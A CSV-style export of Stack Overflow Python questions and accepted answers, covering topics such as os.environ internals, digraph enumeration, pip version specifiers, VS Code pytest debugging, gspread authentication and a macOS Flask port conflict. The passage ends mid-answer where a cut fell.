"71671866","1","Python: What is the difference between `lambda` and `lambda_`?","<p>I know the function of <code>lambda:</code> and <code>lambda var:</code> , but what does <code>lambda_:</code> means acutally?</p>
","71671890","<p><code>lambda_</code> is just a variable name, like any other. Like <code>foo</code> or <code>x</code>.</p>
<p>If you saw:</p>
<pre><code>lambda_: Something
</code></pre>
<p>Then that is actually a <em>variable annotation</em>, for type hints, so the same as:</p>
<pre><code>num: int
num = 0
</code></pre>
"
"71641609","1","How does CPython implement os.environ?","<p>I was looking through <a href=""https://github.com/python/cpython/blob/main/Lib/os.py"" rel=""noreferrer"">source</a> and noticed that it references a variable <code>environ</code> in methods before its defined:</p>
<pre><code>def _createenviron():
    if name == 'nt':
        # Where Env Var Names Must Be UPPERCASE
        def check_str(value):
            if not isinstance(value, str):
                raise TypeError(&quot;str expected, not %s&quot; % type(value).__name__)
            return value
        encode = check_str
        decode = str
        def encodekey(key):
            return encode(key).upper()
        data = {}
        for key, value in environ.items():
            data[encodekey(key)] = value
    else:
        # Where Env Var Names Can Be Mixed Case
        encoding = sys.getfilesystemencoding()
        def encode(value):
            if not isinstance(value, str):
                raise TypeError(&quot;str expected, not %s&quot; % type(value).__name__)
            return value.encode(encoding, 'surrogateescape')
        def decode(value):
            return value.decode(encoding, 'surrogateescape')
        encodekey = encode
        data = environ
    return _Environ(data,
        encodekey, decode,
        encode, decode)

# unicode environ
environ = _createenviron()
del _createenviron
</code></pre>
<p>So how does <code>environ</code> get setup? I cant seem to reason about where its initialized and declared so that <code>_createenviron</code> can use it?</p>
","71682620","<p>TLDR search for <code>from posix import *</code> in <code>os</code> module content.</p>
<p>The <code>os</code> module imports all public symbols from <code>posix</code> (Unix) or <code>nt</code> (Windows) low-level module at the beginning of <code>os.py</code>.</p>
<p><code>posix</code> exposes <code>environ</code> as a plain Python <code>dict</code>.
<code>os</code> wraps it with <code>_Environ</code> dict-like object that updates environment variables on <code>_Environ</code> items changing.</p>
"
"71597789","1","Generate all digraphs of a given size up to isomorphism","<p>I am trying to generate all directed graphs with a given number of nodes up to <a href=""https://en.wikipedia.org/wiki/Graph_isomorphism"" rel=""nofollow noreferrer"">graph isomorphism</a> so that I can feed them into another Python program. Here is a naive reference implementation using NetworkX, I would like to speed it up:</p>
<pre><code>from itertools import combinations, product
import networkx as nx

def generate_digraphs(n):
  graphs_so_far = list()
  nodes = list(range(n))
  possible_edges = [(i, j) for i, j in product(nodes, nodes) if i != j]
  for edge_mask in product([True, False], repeat=len(possible_edges)):
    edges = [edge for include, edge in zip(edge_mask, possible_edges) if include]
    g = nx.DiGraph()
    g.add_nodes_from(nodes)
    g.add_edges_from(edges)
    if not any(nx.is_isomorphic(g_before, g) for g_before in graphs_so_far):
      graphs_so_far.append(g)
  return graphs_so_far

assert len(generate_digraphs(1)) == 1
assert len(generate_digraphs(2)) == 3
assert len(generate_digraphs(3)) == 16
</code></pre>
<p>The number of such graphs seems to grow pretty quickly and is given by this <a href=""https://oeis.org/A000273"" rel=""nofollow noreferrer"">OEIS sequence</a>. I am looking for a solution that is able to generate all graphs up to 7 nodes (about a billion graphs in total) in a reasonable amount of time.</p>
<p>Representing a graph as a NetworkX object is not very important; for example, representing a graph with an adjacency list or using a different library is good with me.</p>
","71701505","<p>There’s a useful idea that I learned from Brendan McKay’s paper
“Isomorph-free exhaustive generation” (though I believe that it predates
that paper).</p>
<p>The idea is that we can organize the isomorphism classes into a tree,
where the singleton class with the empty graph is the root, and each
class with graphs having n &gt; 0 nodes has a parent class with graphs
having n − 1 nodes. To enumerate the isomorphism classes of graphs with
n &gt; 0 nodes, enumerate the isomorphism classes of graphs with n − 1
nodes, and for each such class, extend its representatives in all
possible ways to n nodes and filter out the ones that aren’t actually
children.</p>
<p>The Python code below implements this idea with a rudimentary but
nontrivial graph isomorphism subroutine. It takes a few minutes for n =
6 and (estimating here) on the order of a few days for n = 7. For extra
speed, port it to C++ and maybe find better algorithms for handling the
permutation groups (maybe in TAoCP, though most of the graphs have no
symmetry, so it’s not clear how big the benefit would be).</p>
<pre><code>import cProfile
import collections
import itertools
import random


# Returns labels approximating the orbits of graph. Two nodes in the same orbit
# have the same label, but two nodes in different orbits don't necessarily have
# different labels.
def invariant_labels(graph, n):
    labels = [1] * n
    for r in range(2):
        incoming = [0] * n
        outgoing = [0] * n
        for i, j in graph:
            incoming[j] += labels[i]
            outgoing[i] += labels[j]
        for i in range(n):
            labels[i] = hash((incoming[i], outgoing[i]))
    return labels


# Returns the inverse of perm.
def inverse_permutation(perm):
    n = len(perm)
    inverse = [None] * n
    for i in range(n):
        inverse[perm[i]] = i
    return inverse


# Returns the permutation that sorts by label.
def label_sorting_permutation(labels):
    n = len(labels)
    return inverse_permutation(sorted(range(n), key=lambda i: labels[i]))


# Returns the graph where node i becomes perm[i] .
def permuted_graph(perm, graph):
    perm_graph = [(perm[i], perm[j]) for (i, j) in graph]
    perm_graph.sort()
    return perm_graph


# Yields each permutation generated by swaps of two consecutive nodes with the
# same label.
def label_stabilizer(labels):
    n = len(labels)
    factors = (
        itertools.permutations(block)
        for (_, block) in itertools.groupby(range(n), key=lambda i: labels[i])
    )
    for subperms in itertools.product(*factors):
        yield [i for subperm in subperms for i in subperm]


# Returns the canonical labeled graph isomorphic to graph.
def canonical_graph(graph, n):
    labels = invariant_labels(graph, n)
    sorting_perm = label_sorting_permutation(labels)
    graph = permuted_graph(sorting_perm, graph)
    labels.sort()
    return max(
        (permuted_graph(perm, graph), perm[sorting_perm[n - 1]])
        for perm in label_stabilizer(labels)
    )


# Returns the list of permutations that stabilize graph.
def graph_stabilizer(graph, n):
    return [
        perm
        for perm in label_stabilizer(invariant_labels(graph, n))
        if permuted_graph(perm, graph) == graph
    ]


# Yields the subsets of range(n) .
def power_set(n):
    for r in range(n + 1):
        for s in itertools.combinations(range(n), r):
            yield list(s)


# Returns the set where i becomes perm[i] .
def permuted_set(perm, s):
    perm_s = [perm[i] for i in s]
    perm_s.sort()
    return perm_s


# If s is canonical, returns the list of permutations in group that stabilize s.
# Otherwise, returns None.
def set_stabilizer(s, group):
    stabilizer = []
    for perm in group:
        perm_s = permuted_set(perm, s)
        if perm_s &lt; s:
            return None
        if perm_s == s:
            stabilizer.append(perm)
    return stabilizer


# Yields one representative of each isomorphism class.
def enumerate_graphs(n):
    assert 0 &lt;= n
    if 0 == n:
        yield []
        return
    for subgraph in enumerate_graphs(n - 1):
        sub_stab = graph_stabilizer(subgraph, n - 1)
        for incoming in power_set(n - 1):
            in_stab = set_stabilizer(incoming, sub_stab)
            if not in_stab:
                continue
            for outgoing in power_set(n - 1):
                out_stab = set_stabilizer(outgoing, in_stab)
                if not out_stab:
                    continue
                graph, i_star = canonical_graph(
                    subgraph
                    + [(i, n - 1) for i in incoming]
                    + [(n - 1, j) for j in outgoing],
                    n,
                )
                if i_star == n - 1:
                    yield graph


def test():
    print(sum(1 for graph in enumerate_graphs(5)))


cProfile.run(&quot;test()&quot;)
</code></pre>
"
"72244046","1","Use >= or ~= for compatibilty across systems?","<p>My goal is a simple and proper way to export my <code>venv</code>. In the optimal case, the resulting <code>requirements.txt</code> works on all compatible systems.</p>
<p>At the moment I use <code>pip freeze &gt; requirements.txt</code>.
This uses the <code>==</code> &quot;Version matching clause&quot;. On an other system the file might not work due to conflicting versions, although it was compatible.</p>
<p>In <a href=""https://peps.python.org/pep-0440/#version-specifiers"" rel=""nofollow noreferrer"">PEP 440</a> there is also a <code>~=</code> &quot;Compatible clause&quot;.  However, I cannot find an option for that in pip freeze <a href=""https://pip.pypa.io/en/stable/cli/pip_freeze/"" rel=""nofollow noreferrer"">docs</a>. Using &quot;find and replace&quot; or a tool like <code>awk</code> to replace == with ~= works okay.</p>
<p>My naive conclusion is that <code>~=</code> would be the ideal clause to use in <code>requirements.txt</code>. However, when I look at popular packages they often use <code>&gt;=</code> to specify a version. E.g. at <a href=""https://github.com/urllib3/urllib3/blob/main/mypy-requirements.txt"" rel=""nofollow noreferrer"">urllib3</a>.</p>
<p>Is there a drawback to ~=, which I do not see?<br />
If that is not the case:
Why is &gt;= used in so many packages?</p>
<p><strong>Edit:</strong><br />
<a href=""https://pypi.org/project/pigar/"" rel=""nofollow noreferrer"">Pigar</a> has an <a href=""https://github.com/damnever/pigar/issues/37"" rel=""nofollow noreferrer"">option</a> to use &gt;= natively and there is a comparison to freeze <a href=""https://stackoverflow.com/a/71082302/17834402"">here</a>. Apparently, they also do not use ~=.<br />
Yet, I am still not sure which one to use, as &gt;= could break when there is a major version change. Also packages which are a lower minor version would be marked incompatible, although they should be compatible.</p>
","72790287","<p>Your question is not simple to answer and touches on some nuances in the <em>social</em> dynamics around versioning.</p>
<p>Easy stuff first: sometimes versions use a terminal suffix to indicate something like prerelease builds, and if you're dependent on a prerelease build or some other situation where you expect the terminal suffix to iterate repeatedly (especially in a non-ordered way), <code>~=</code> helps you by letting you accept all iterations on a build. <a href=""https://peps.python.org/pep-0440/#compatible-release"" rel=""nofollow noreferrer"">PEP 440</a> contains a good example:</p>
<pre><code>~= 2.2.post3
&gt;= 2.2.post3, == 2.*
</code></pre>
<p>Second, <code>pip freeze</code> is not meant to be used to generate a requirements list. It just dumps a list of everything you've currently got, which is far more than actually needs to go in a requirements file. So it makes sense that it would only use <code>==</code>: for example, it's meant to let you replicate a set of packages to an 'identical' environment elsewhere.</p>
<hr />
<p>Hard stuff next. Under <a href=""https://semver.org/"" rel=""nofollow noreferrer"">semantic versioning</a>, the only backwards-incompatible revisions <em>should</em> be major revisions. (This depends on how much you trust the maintainer - put a pin in that.) However, if specifying a patch number, <code>~=</code> <em>won't upgrade</em> to a new minor rev even if one is available and it should, in principle, be backwards-compatible. This is important to talk about clearly, because &quot;compatible release&quot; has two different meanings: in semantic versioning, a &quot;compatible release&quot; is (colloquially) <em>any</em> rev between this one and the next major rev; in requirements files, a &quot;compatible release&quot; is a revision that patches the <em>same</em> terminal rev <em>only</em>.</p>
<p>Let me be clear now: when I say &quot;backwards-compatible,&quot; I mean it in the semantic versioning sense only. (If the package in question doesn’t use semantic versioning, or has a fourth version number, well - generally <code>~=</code> will still match all patches, but check to be sure.)</p>
<p>So, there's a trade to be made between <code>&gt;=</code> and <code>~=</code>, and it has to do with chains of trust in dependency management. Here are three principles - then after, I'll offer some speculation on why so many package maintainers use <code>&gt;=</code>.</p>
<ol>
<li><p><strong>In general,</strong> it's the responsibility of a package maintainer to ensure that all version numbers matching their requirements.txt are compatible with that package, with the occasional exception of deprecated patch revs. This includes ensuring that the requirements.txt is as small as possible and contains only <em>that package's</em> requirements. (More broadly, “require as little as possible and validate it as much as possible.”)</p>
</li>
<li><p><strong>In general,</strong> no matter the language and no matter the package, dependencies reflect a chain of trust. I am implementing a package; I trust you to maintain your package (and its requirements file) in a way that continues to function. You are trusting <em>your</em> dependencies to maintain <em>their</em> packages in a way that continues to function. In turn, your downstream consumers are expecting you to maintain <em>your</em> package in a way that means it continues to function for them. This is based on human trust. The number is 'just' a convenient communication tool.</p>
</li>
<li><p><strong>In general,</strong> no matter the change set, package maintainers try extremely hard to avoid major versions. No one wants to be the guy who releases a major rev and forces consumers to version their package through a substantial rewrite - or consign their projects to an old and unsupported version. We accept major revs as necessary (that's why we have systems to track them), but folks are typically loath to use them until they really don't have another option.</p>
</li>
</ol>
<p>Synthesize these three. From the perspective of a package maintainer, supposing one trusts the maintainers one is dependent upon (as one should), <strong>it is broadly speaking <em>more reasonable</em> to expect major revisions to be rare, than it is to expect minor revisions to be backwards-incompatible by accident.</strong> This means the number of reactive updates you'll need to make in the <code>&gt;=</code> scheme should be small (but, of course, nonzero).</p>
<hr />
<p>That's a lot of groundwork. I know this is long, but this is the good part: the trade.</p>
<p>For example, suppose I developed a package, <code>helloworld == 0.7.10</code>. You developed a package atop <code>helloworld == 0.7.10</code>, and then I later rev <code>helloworld</code> to 0.8. Let's start by considering the best case situation: that I am still offering support for the 0.7.10 version and (ex.) patch it to 0.7.11 at a later date, even while maintaining 0.8 separately. This allows <em>your downstream consumers</em> to accept patches without losing compatibility with your package, even when using <code>~=</code>. And, you are &quot;guaranteed&quot; that future patches won't break your current implementation or require maintenance in event of mistakes - I’m doing that work <em>for</em> you. Of course, this only works if I go to the trouble of maintaining both 0.7 and 0.8, but this does seem advantageous...</p>
<p>So, why does it break? Well, one example. What happens if you specify <code>helloworld ~= 0.7.10</code> in your package, but <em>another</em> upstream dependency of yours (that isn't me!) upgrades, and now uses <code>helloworld &gt;= 0.8.1</code>? Since <em>you</em> relied on a minor version's compatibility requirements, there's now a conflict. Worse, what if a consumer of <em>your</em> package wants to use new features from <code>helloworld == 0.8.1</code> that aren't available in 0.7? They can't.</p>
<p>But remember, a semver-compliant package built on helloworld v0.7 should be just fine running on helloworld v0.8 - there should be no breaking changes. <strong>It's <em>your</em> specification of <code>~=</code> that is the most likely to have broken a dependency or consumer need for no good reason - not <code>helloworld</code>.</strong></p>
<p>If instead you had used <code>helloworld &gt;= 0.7.10</code>, then you would've allowed for the installation of 0.8, even when your package was not explicitly written using it. If 0.8 doesn't break your implementation, <em>which is supposed to be true</em>, then allowing its use would be the correct manual decision anyway. You don't even necessarily need to know what I'm doing or how I'm writing 0.8, because minor versions should only be <em>adding</em> functionality - functionality you're obviously not using, but someone else might want to.</p>
<p>The chain of trust is leaky, though. As the maintainer of helloworld, I might not know <em>for certain</em> whether my revision 0.8 introduces bugs or potential issues that could interfere with the usage of a package originally written for 0.7. Sure, by naming it 0.8 and not 1.0, I claim that I will (and should be expected to!) provide patches to <code>helloworld</code> as needed to address failures to maintain backwards-compatibility. But in practice, that might become untenable, or simply not happen, especially in the very unusual case (joke) where a package does not have rigorous unit and regression tests.</p>
<p>So your trade, as a package developer and maintainer, boils down to this: <strong>Do you trust me, the maintainer of <code>helloworld</code>, to infrequently release major revs, and to ensure that minor revs do not risk breaking backwards-compatibility, <em>more than</em> you need your downstream consumers to be guaranteed a stable release?</strong></p>
<hr />
<p>Using &gt;= means:</p>
<ul>
<li>(Rare): If I release a major rev, you'll need to update your requirements file to specify which major rev you are referring to.</li>
<li>(Uncommon): If I release a minor rev, but a bug, review, regression failure, etc. cause that minor rev to break packages built atop old versions, you'll either need to update your requirements file to specify which <em>minor</em> rev you are referring to, or wait for me to patch it further. (What if I decline to patch it further, or worse, take my sweet time doing so?)</li>
</ul>
<p>Using ~= means:</p>
<ul>
<li>If any of your upstream packages end up using a different minor revision than the one your package was originally built to use, you risk a dependency conflict between you and your upstream providers.</li>
<li>If any of your downstream consumers want or need to use features introduced in a <em>later</em> minor revision of a package you depend upon, they can't - not without overriding your requirements file and hoping for the best.</li>
<li>If I stop supporting a minor revision of a package you use, and release critical patches on a future minor rev only, you and your consumers won't get them. (What if these are important, ex. security updates? <code>urllib3</code> could be a great example.)</li>
</ul>
<p>If those 'rare' or 'uncommon' events are so disruptive to your project that you just <em>can't conceive</em> of a world in which you'd want to take that risk, use <code>~=</code>, even at the cost of convenience/security to your downstream consumers. But if you want to give downstream consumers the most flexibility possible, don't mind dealing with the occasional breaking-change event, and want to make sure your own code typically runs on the most recent version it can, using <code>&gt;=</code> is the safer way to go. It's usually the right decision, anyway.</p>
<p>For this reason, I expect <em>most</em> maintainers deliberately use <code>&gt;=</code> <em>most</em> of the time. Or maybe it's force of habit. Or maybe I'm just reading too much into it.</p>
"
"71811731","1","How do you get VS Code to write Debug stdout to the Debug Console?","<p>I am trying to debug my Python Pytest tests in VS Code, using the Testing Activity on the left bar. I am able to run my tests as expected, with some passing and some failing. I would like to debug the failing tests to more accurately determine what is causing the failures.</p>
<p>When I run an individual test in debug mode VS Code is properly hitting a breakpoint and stopping, and the Run and Debug pane shows the local variables. I can observe the status of local variables either in the Variables &gt; Local pane or through the REPL, by typing the name of the variable.</p>
<p>When I try to print out any statement, such as using <code>&gt; print(&quot;here&quot;)</code> I do not get any output to the Debug Console. When I reference a variable, or put the string directly using <code>&gt; &quot;here&quot;</code> I do see the output to the Debug Console.</p>
<p>It seems to me that the stdout of my REPL is not displaying to the Debug Console. A number of answers online have been suggesting to add options like <code>&quot;redirectOutput&quot;: true</code> or <code>&quot;console&quot;: &quot;integratedTerminal&quot;</code>, but neither of those seem to have worked. My full <code>launch.json</code> is below:</p>
<pre><code>{
    // Use IntelliSense to learn about possible attributes.
    // Hover to view descriptions of existing attributes.
    // For more information, visit: https://go.microsoft.com/fwlink/?linkid=830387
    &quot;version&quot;: &quot;0.2.0&quot;,
    &quot;configurations&quot;: [
        {
            &quot;name&quot;: &quot;Python: Current File&quot;,
            &quot;type&quot;: &quot;python&quot;,
            &quot;request&quot;: &quot;launch&quot;,
            &quot;program&quot;: &quot;${file}&quot;,
            &quot;debugOptions&quot;: [
                &quot;WaitOnAbnormalExit&quot;,
                &quot;WaitOnNormalExit&quot;
            ],
            &quot;console&quot;: &quot;integratedTerminal&quot;,
            &quot;stopOnEntry&quot;: false,
            &quot;redirectOutput&quot;: true,
            &quot;outputCapture&quot;: &quot;std&quot;
        }
    ]
}
</code></pre>
<p>Is there another setting I'm missing to enable this output? Have I got the wrong console type?</p>
","71888908","<p>So After a lot of frustrating &quot;debugging&quot; I found a solution that worked for me (if you are using <code>pytest</code> as me):</p>
<h3>tldr</h3>
<p>Two solutions:</p>
<ol>
<li><p>downgrade your vscode python extension to <code>v2022.2.1924087327</code> that will do the trick (or any version that had the <code>debugpy&lt;=1.5.1</code>).<br />
<a href=""https://i.stack.imgur.com/CKRmhm.png"" rel=""nofollow noreferrer""><img src=""https://i.stack.imgur.com/CKRmhm.png"" alt=""enter image description here"" /></a></p>
</li>
<li><p>Or, Launch the debbuger from the <code>debug tab</code> not the <code>testing tab</code>. And use a configuration like the following one</p>
<pre><code>{
    &quot;name&quot;: &quot;Python: Current File (Integrated Terminal)&quot;,
    &quot;type&quot;: &quot;python&quot;,
    &quot;request&quot;: &quot;launch&quot;,
    &quot;program&quot;: &quot;${file}&quot;,
    &quot;console&quot;: &quot;integratedTerminal&quot;,
    &quot;purpose&quot;: [&quot;debug-test&quot;], 
    &quot;redirectOutput&quot;: true,
    &quot;env&quot;: {&quot;PYTHONPATH&quot;: &quot;${workspaceRoot}&quot;}
}
</code></pre>
</li>
<li><p><strong>Bonus</strong>. If you are using <code>pytest</code> you can temporarily disable the <a href=""https://doc.pytest.org/en/latest/how-to/capture-stdout-stderr.html#accessing-captured-output-from-a-test-function"" rel=""nofollow noreferrer"">capture of the stdout of pytest</a>  so your print statements, and the <code>print</code> function, *if you breakpoint inside the <code>contextmanager</code>, will work too. This is very cumbersome but points out the <a href=""https://github.com/microsoft/debugpy/issues/899#issuecomment-1095384631"" rel=""nofollow noreferrer"">original problem</a> of why the prints are not longer working.</p>
<pre><code>def test_disabling_capturing(capsys):
    print('this output is captured')
    with capsys.disabled():
        print('output not captured, going directly to sys.stdout')
    print('this output is also captured')
</code></pre>
</li>
</ol>
<h4>the long explanation</h4>
<p>so the problem apparently is that the <code>debugpy</code> (which is the library used by <code>vscode</code> python debugger) in is last version <a href=""https://github.com/microsoft/debugpy/releases/tag/v1.6.0"" rel=""nofollow noreferrer""><code>v1.6.0</code></a> fixed this <a href=""https://github.com/microsoft/debugpy/issues/827"" rel=""nofollow noreferrer"">&quot;bug (827)&quot;</a>. In a nutshell, this &quot;bug&quot; was that vscode &quot;duplicated&quot; all the stdout when debugging because it captures the <code>pytest</code> <code>stdout</code> and replicate it in the debugger console.
This is because, by default, <code>pytest</code> captures all the stdout and store it (so when running all test in parallel it doesn't create a mess).</p>
<p>After &quot;fixing&quot; this issue, now, when you launch the test via the <code>testing tab</code>, by default, <code>pytest</code> is capturing all the <code>stdout</code> and the &quot;new&quot; (<code>&gt;=v1.6.1</code>) <code>debugpy</code> ignores it. Therefore, all the print statements are not shown anymore on the debug console, even when you call <code>print()</code> in a breakpoint, because are captured by pytest (IDK where the <code>pytest</code> captured stdout is showing/stored if it is anywhere). which, in my case is a PITA.</p>
<p>You can disable the <code>pytest</code> capture option using the flag <code>-s</code> or <code>--capture=no</code> when launching pytest in a console or even from the debug tab as a custom configuration. but the problem is that there is <a href=""https://stackoverflow.com/a/62053867/5318634"">no way (apparently)</a> to add these parameters in vscode for the <code>testing tab</code> so pytest is executed using that option.</p>
<p>Therefore the solution that I found was to downgrade the python extension to a version that uses an older version of <code>debugpy</code> <code>v1.5.1</code>, you can see in the <strong>python extension</strong> changelog that from the  version <a href=""https://github.com/microsoft/vscode-python/blob/main/CHANGELOG.md#202240-30-march-2022"" rel=""nofollow noreferrer""><code>2022.4.0</code></a> they update the <code>debugpy</code> version, so going before that did the trick for me, you will have the double <code>stdout</code> &quot;bug&quot; in the console, but the <code>print</code> statement will work.</p>
<p>ref: The <a href=""https://github.com/microsoft/debugpy/issues/678#issuecomment-1099559549"" rel=""nofollow noreferrer"">issue</a> that lead me to the solution</p>
<hr />
<p>You may make your voice heard here in the vscode-python <a href=""https://github.com/microsoft/vscode-python/issues/19322"" rel=""nofollow noreferrer"">issues</a></p>
"
"72235819","1","How can I redirect module imports with modern Python?","<p>I am maintaining a python package in which I did some restructuring. Now, I want to support clients who still do <code>from my_package.old_subpackage.foo import Foo</code> instead of the new <code>from my_package.new_subpackage.foo import Foo</code>, without explicitly reintroducing many files that do the forwarding.  (<code>old_subpackage</code> still exists, but no longer contains <code>foo.py</code>.)</p>
<p>I have learned that there are &quot;loaders&quot; and &quot;finders&quot;, and my impression was that I should implement a <em>loader</em> for my purpose, but I only managed to implement a <em>finder</em> so far:</p>
<pre class=""lang-py prettyprint-override""><code>RENAMED_PACKAGES = {
    'my_package.old_subpackage.foo': 'my_package.new_subpackage.foo',
}

# TODO: ideally, we would not just implement a &quot;finder&quot;, but also a &quot;loader&quot;
# (using the importlib.util.module_for_loader decorator); this would enable us
# to get module contents that also pass identity checks
class RenamedFinder:

    @classmethod
    def find_spec(cls, fullname, path, target=None):
        renamed = RENAMED_PACKAGES.get(fullname)
        if renamed is not None:
            sys.stderr.write(
                f'WARNING: {fullname} was renamed to {renamed}; please adapt import accordingly!\n')
            return importlib.util.find_spec(renamed)
        return None

sys.meta_path.append(RenamedFinder())
</code></pre>
<p><a href=""https://docs.python.org/3.5/library/importlib.html#importlib.util.module_for_loader"" rel=""nofollow noreferrer"">https://docs.python.org/3.5/library/importlib.html#importlib.util.module_for_loader</a> and related functionality, however, seem to be deprecated.  I know it's not a very pythonic thing I am trying to achieve, but I would be glad to learn that it's achievable.</p>
","72244240","<p>On import of your package's <code>__init__.py</code>, you can place whatever objects you want into <code>sys.modules</code>, the values you put in there will be returned by <code>import</code> statements:</p>
<pre><code>from . import new_package
from .new_package import module1, module2
import sys

sys.modules[&quot;my_lib.old_package&quot;] = new_package
sys.modules[&quot;my_lib.old_package.module1&quot;] = module1
sys.modules[&quot;my_lib.old_package.module2&quot;] = module2
</code></pre>
<p>If someone now uses <code>import my_lib.old_package</code> or <code>import my_lib.old_package.module1</code> they will obtain a reference to <code>my_lib.new_package.module1</code>. Since the import machinery already finds the keys in the <code>sys.modules</code> dictionary, it never even begins looking for the old files.</p>
<p>If you want to avoid importing all the submodules immediately, you can emulate a bit of lazy loading by placing a module with a <code>__getattr__</code> in <code>sys.modules</code>:</p>
<pre><code>from types import ModuleType
import importlib
import sys

class LazyModule(ModuleType):
 def __init__(self, name, mod_name):
  super().__init__(name)
  self.__mod_name = name

 def __getattr__(self, attr):
  if &quot;_lazy_module&quot; not in self.__dict__:
    self._lazy_module = importlib.import(self.__mod_name, package=&quot;my_lib&quot;)
  return self._lazy_module.__getattr__(attr)

sys.modules[&quot;my_lib.old_package&quot;] = LazyModule(&quot;my_lib.old_package&quot;, &quot;my_lib.new_package&quot;)
</code></pre>
"
"71686960","1","TypeError: Credentials need to be from either oauth2client or from google-auth","<p>I'm new to python and currently is working on a project that requires me to export pandas data frame from google collab to a google spreadsheet with multiple tabs. Previously when I run this specific code, there are no errors but then now it shows an error like this:</p>
<pre><code>    TypeError                                 Traceback (most recent call last)
&lt;ipython-input-74-c8b829c43616&gt; in &lt;module&gt;()
      5 gauth.credentials = GoogleCredentials.get_application_default()
      6 drive = GoogleDrive(gauth)
----&gt; 7 gc = gspread.authorize(GoogleCredentials.get_application_default())

2 frames
/usr/local/lib/python3.7/dist-packages/gspread/utils.py in convert_credentials(credentials)
     59 
     60     raise TypeError(
---&gt; 61         'Credentials need to be from either oauth2client or from google-auth.'
     62     )
     63 

TypeError: Credentials need to be from either oauth2client or from google-auth.
</code></pre>
<p>Here is the code that I use to create authentication.</p>
<pre><code>#Import PyDrive and associated libraries.
#This only needs to be done once per notebook.

from pydrive.auth import GoogleAuth
from pydrive.drive import GoogleDrive
from google.colab import auth
from oauth2client.client import GoogleCredentials
import gspread

#Authenticate and create the PyDrive client.
#This only needs to be done once per notebook.
auth.authenticate_user()
gauth = GoogleAuth()
gauth.credentials = GoogleCredentials.get_application_default()
drive = GoogleDrive(gauth)
gc = gspread.authorize(GoogleCredentials.get_application_default())
</code></pre>
<p>Any help would be much appreciated.</p>
","71711274","<p>I had the same problem today and found this answer: <a href=""https://github.com/burnash/gspread/issues/1014#issuecomment-1082536016"" rel=""noreferrer"">https://github.com/burnash/gspread/issues/1014#issuecomment-1082536016</a></p>
<p>I finally solved it by replacing the old code with this one:</p>
<pre><code>from google.colab import auth
auth.authenticate_user()

import gspread
from google.auth import default
creds, _ = default()

gc = gspread.authorize(creds)
</code></pre>
"
"72795799","1","How to solve 403 error with Flask in Python?","<p>I made a simple server using python flask in mac. Please find below the code.</p>
<pre><code>from flask import Flask

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def hello():
    print(&quot;request received&quot;)
    return &quot;Hello world!&quot;

    
if __name__ == &quot;__main__&quot;:
    app.run(debug=True)
</code></pre>
<p>I run it using <code>python3 main.py</code> command.</p>
<p>While calling above API on url  <code>http://localhost:5000/</code> from Postman using GET / POST method, it always returns http 403 error.</p>
<blockquote>
<p>Python version : 3.8.9</p>
<p>OS : Mac OS 12.4</p>
<p>Flask : 2.1.2</p>
</blockquote>
","72797062","<p>Mac OSX Monterey (12.x) currently uses ports 5000 and 7000 for its Control centre hence the issue.</p>
<p>Try running your app from port other than <code>5000</code> and <code>7000</code></p>
<p>use this:</p>
<pre><code>if __name__ == &quot;__main__&quot;:
    app.run(port=8000, debug=True)
</code></pre>
<p>and then run your flask file, eg: <code>app.py</code></p>
<p><code>python app.py</code></p>
<p>You can also run using the <code>flask</code> command line interface using this command provided you have set the environment variable necessary for flask CLI.</p>
<p><code>flask run --port 8000</code></p>
<p>You can also turn off <code>AirPlay Receiver</code> in the <code>Sharing</code> via System Preference.</p>
<p>Related discussion here: <a href=""https://developer.apple.com/forums/thread/682332"" rel=""noreferrer"">https://developer.apple.com/forums/thread/682332</a></p>
<p><strong>Update(November 2022):</strong></p>
<p>Mac OSX Ventura(13.x) still has this problem and is fixed with the change in default port as mentioned above.</p>
"
"72824468","1","pip installing environment.yml as if it's a requirements.txt","<p>I have an <code>environment.yml</code> file, but don't want to use Conda:</p>
<pre class=""lang-yaml prettyprint-override""><code>name: foo
channels:
  - defaults
dependencies:
  - matplotlib=2.2.2
</code></pre>
<p>Is it possible to have <code>pip</code> install the dependencies inside an <code>environment.yml</code> file as if it's a <code>requirements.txt</code> file?</p>
<p>I tried <code>pip install -r environment.yml</code> and it doesn't work with <code>pip==22.1.2</code>.</p>
","72824497","<p>No, <code>pip</code> does not support this format. The format it expects for a requirements file is documented <a href=""https://pip.pypa.io/en/stable/reference/requirements-file-format/"" rel=""noreferrer"">here</a>. You'll have to convert the <code>environment.yml</code> file to a <code>requirements.txt</code> format either manually or via a script that automates this process. However, keep in mind that not all packages on Conda will be available on PyPI.</p>
"
"72299007","1","How to create instance of multiple inherited class?","<p>I have this code:</p>
<pre><code>class Person:
    def __init__(self, name, last_name, age):
        self.name = name
        self.last_name = last_name
        self.age = age 

class Student(Person):
    def __init__(self, name, last_name, age, indexNr, notes):
        super().__init__(name, last_name, age)
        self.indexNr = indexNr
        self.notes = notes

class Employee(Person):
    def __init__(self, name, last_name, age, salary, position):
        super().__init__(name, last_name, age)
        self.salary = salary
        self.position = position

class WorkingStudent(Student, Employee):
    def __init__(self, name, last_name, age, indexNr, notes, salary, position):
        Student.__init__(name, last_name, age, indexNr, notes)
        Employee.__init__(name, last_name, age, salary, position)
</code></pre>
<p>I want to create a WorkingStudent instance like this:</p>
<pre><code>ws = WorkingStudent(&quot;john&quot;, &quot;brown&quot;, 18, 1, [1,2,3], 1000, 'Programmer')
</code></pre>
<p>but it's not working, I get this error:</p>
<pre><code>TypeError: __init__() missing 1 required positional argument: 'notes'
</code></pre>
<p>Or what I am doing wrong here? Also, I have already tried <code>super()</code> in WorkingStudent class but it calls only the constructor of the first passed class. i.e in this case <code>Student</code></p>
<p>Note: I have already gone through multiple StackOverflow queries but I couldn't find anything that could answer this. (or maybe I have missed).</p>
","72299178","<p>Instead of explicit classes, use <code>super()</code> to pass arguments along the mro:</p>
<pre><code>class Person:
    def __init__(self, name, last_name, age):
        self.name = name
        self.last_name = last_name
        self.age = age 

class Student(Person):
    def __init__(self, name, last_name, age, indexNr, notes, salary, position):
        # since Employee comes after Student in the mro, pass its arguments using super
        super().__init__(name, last_name, age, salary, position)
        self.indexNr = indexNr
        self.notes = notes

class Employee(Person):
    def __init__(self, name, last_name, age, salary, position):
        super().__init__(name, last_name, age)
        self.salary = salary
        self.position = position

class WorkingStudent(Student, Employee):
    def __init__(self, name, last_name, age, indexNr, notes, salary, position):
        # pass all arguments along the mro
        super().__init__(name, last_name, age, indexNr, notes, salary, position)

# uses positional arguments            
ws = WorkingStudent(&quot;john&quot;, &quot;brown&quot;, 18, 1, [1,2,3], 1000, 'Programmer')
# then you can print stuff like
